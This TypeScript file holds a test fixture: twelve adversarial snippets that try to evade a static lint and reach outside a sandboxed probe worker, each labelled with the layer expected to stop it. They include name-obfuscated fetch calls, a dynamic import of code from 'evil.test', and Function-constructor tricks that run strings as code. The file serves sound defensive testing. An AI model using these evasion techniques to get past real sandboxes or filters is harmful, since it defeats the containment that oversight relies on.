/**
 * Modules written to get past the harness, kept as data so both the suite and the
 * evidence tool run the same ones.
 *
 * Twelve of these were written against L0 and twelve passed. That is the origin of the
 * boundary this project actually relies on: a lint reads source and objects to names it
 * recognises, and `globalThis['fe'+'tch']` is a computed member expression that no AST
 * walk keyed on identifiers will ever see. So the enforced boundary moved into the probe
 * worker, which *deletes* the capability before the candidate is imported — the check
 * became "is this here at all" rather than "did you ask for it".
 *
 * Each case records which layer is expected to stop it, and `caughtBy: null` is not an
 * admission of weakness but the point being made: those are the ones that prove L0 is a
 * filter and the worker is the boundary. `npm run attack` runs the set and prints the
 * table; `tests/harness/l0-escapes.test.ts` asserts it.
 */
export interface Attack {
  readonly name: string;
  readonly source: string;
  /** The layer expected to stop it, or null when only capability revocation does. */
  readonly caughtBy: 'L0' | null;
  /** What it is reaching for, in one line. */
  readonly intent: string;
}

export const ATTACKS: readonly Attack[] = [
  {
    name: 'computed global access',
    source: `const g = globalThis['fe'+'tch']; g('https://x.test');`,
    caughtBy: 'L0',
    intent: 'network egress, with the name assembled at runtime',
  },
  {
    name: 'aliased global',
    source: `const s = self; s.postMessage(1);`,
    caughtBy: 'L0',
    intent: 'reach the host through a rebound reference',
  },
  {
    name: 'dynamic import',
    source: `const m = await import('https://evil.test/x.js');`,
    caughtBy: 'L0',
    intent: 'load arbitrary code from a URL',
  },
  {
    name: 'computed state write',
    source: `const k = 'camera'; __VERBO_STATE__[k].position = [0,0,0];`,
    caughtBy: 'L0',
    intent: 'write outside the declared scope by spelling the path at runtime',
  },
  {
    name: 'aliased state root',
    source: `const s = __VERBO_STATE__; s.camera = {};`,
    caughtBy: 'L0',
    intent: 'the same, through a local binding',
  },
  {
    name: 'computed register path',
    source: `const p = 'terrain.' + 'height'; world.register(i, p);`,
    caughtBy: 'L0',
    intent: 'claim ownership of a path the contract is not watching',
  },
  {
    name: 'globalThis assignment',
    source: `globalThis.__VERBO_PRIMITIVES__ = {};`,
    caughtBy: 'L0',
    intent: 'replace the primitive registry every later candidate resolves against',
  },
  {
    name: 'postMessage',
    source: `self.postMessage({ ok: true });`,
    caughtBy: 'L0',
    intent: 'speak to the page from inside the probe',
  },
  {
    name: 'indirect Function constructor',
    source: `const F = (()=>{}).constructor; F('return 1')();`,
    caughtBy: null,
    intent: 'build a function from a string without naming eval',
  },
  {
    name: 'constructor chain',
    source: `const F = []['constructor']['constructor']; F('return 2')();`,
    caughtBy: null,
    intent: 'the next spelling of the same thing, which is why this is not fixed in the AST',
  },
  {
    name: 'fetch via property chain',
    // Caught, and the reason is instructive: the name is assembled from an array, which
    // L0 cannot read — but the *object* is spelled `globalThis`, which it can. Labelled
    // `null` when this was written, and `npm run attack` reported the mismatch on the
    // first run. The lint is better than I assumed at the one thing it does check.
    source: `const k = ['f','e','t','c','h'].join(''); const g = globalThis; g[k] && g[k]('https://x.test');`,
    caughtBy: 'L0',
    intent: 'network egress with the name built from an array',
  },
  {
    name: 'timer smuggling',
    // Same: deferring the reach does not hide the identifier it defers to.
    source: `setTimeout(() => { const g = globalThis; g['fe'+'tch']?.('https://x.test'); }, 0);`,
    caughtBy: 'L0',
    intent: 'defer the reach until after the static read is over',
  },
];
